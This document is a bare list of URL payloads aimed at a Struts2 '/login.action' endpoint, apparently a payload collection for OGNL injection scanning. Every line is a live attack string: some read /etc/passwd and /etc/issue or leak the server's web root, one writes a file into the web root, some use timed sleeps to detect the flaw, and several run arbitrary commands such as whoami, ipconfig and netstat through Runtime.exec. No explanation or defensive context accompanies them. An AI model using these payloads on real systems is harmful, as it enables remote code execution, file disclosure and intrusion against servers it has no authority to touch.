/login.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
/login.action?cardKindName=&redirect:${%23d%3dnew%20java.io.FileReader('/etc/././issue'),%23e%3dnew%20java.io.BufferedReader(%23d),%23f%3d%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine(),%23e.close(),%23d.close(),%23aaaaa%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23xxxxx%3d%23aaaaa.getWriter(),%23xxxxx.println(%23f),%23xxxxx.flush(),%23xxxxx.close()}
/login.action?cardKindName=&redirect:${%23d%3dnew%20java.io.FileReader('/etc/././issue'),%23e%3dnew%20java.io.BufferedReader(%23d),%23f%3d%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine()%2b%23e.readLine(),%23e.close(),%23d.close(),%23aaaaa%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23xxxxx%3d%23aaaaa.getWriter(),%23xxxxx.println(%23f),%23xxxxx.flush(),%23xxxxx.close()}?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
/login.action?aid=&redirect:xxxxx%25{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23path%3d%23req.getRealPath(%22/%22)%2b'/x.html',%23d%3dnew%20java.io.FileWriter(%23path),%23d.write('test‘),%23d.close()}
/login.action?aid=&redirect:xxxxx%25{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23path%3d%23req.getRealPath(%22/%22)%2b'/x.html',%23d%3dnew%20java.io.FileWriter(%23path),%23d.write('test‘),%23d.close()}
/login.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(5000)')(d))
/login.action?foo=(#context["xwork.MethodAccessor.denyMethodExecution"]=+new+java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]=+new+java.lang.Boolean(true),@java.lang.Thread@sleep(5000))(meh)&z[(foo)('meh')]=true
/login.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(h)(('\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter("cmd"))')(d))&(i)(('\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())')(d))&(i01)(('\43webStr\75new\40byte[100]')(d))&(i1)(('\43webRootzproreader.readFully(\43webStr)')(d))&(i111)(('\43webStr12\75new\40java.lang.String(\43webStr)')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43webStr12)')(d))&(i99)(('\43xman.getWriter().close()')(d))&cmd=cmd /c ipconfig
/login.action?class.classLoader.jarPath=(#context["xwork.MethodAccessor.denyMethodExecution"]=+new+java.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#a=@java.lang.Runtime@getRuntime().exec(#req.getParameter("cmd")).getInputStream(),#b=new+java.io.InputStreamReader(#a),#c=new+java.io.BufferedReader(#b),#d=new+char[50000],#c.read(#d),#s3cur1ty=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#s3cur1ty.println(#d),#s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]&cmd=cmd /c netstat -an
/login.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29)